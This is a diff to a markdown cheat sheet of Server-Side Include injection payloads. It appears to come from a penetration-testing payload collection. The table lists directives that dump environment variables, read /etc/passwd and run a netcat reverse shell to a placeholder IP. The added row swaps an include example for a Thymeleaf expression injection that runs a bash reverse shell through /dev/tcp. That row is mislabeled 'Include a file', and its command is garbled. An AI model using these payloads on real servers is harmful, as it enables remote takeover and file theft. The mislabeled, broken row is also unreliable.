@@ -21,7 +21,7 @@ SSI format: `<!--#directive param="value" -->`
 | Print all the variables | `<!--#printenv -->`                      |
 | Setting variables       | `<!--#set var="name" value="Rich" -->`   |
 | Include a file          | `<!--#include file="/etc/passwd" -->`    |
-| Include a file          | `<!--#include virtual="/index.html" -->` |
+| Include a file          | `<p th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('bash -c $@|bash 0 echo bash -i >& /dev/tcp/ip/port/ip/ 0>&1')}">Hello!</p>` |
 | Execute commands        | `<p th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('')}">vcs</p>`                 |
 | Reverse shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |
 
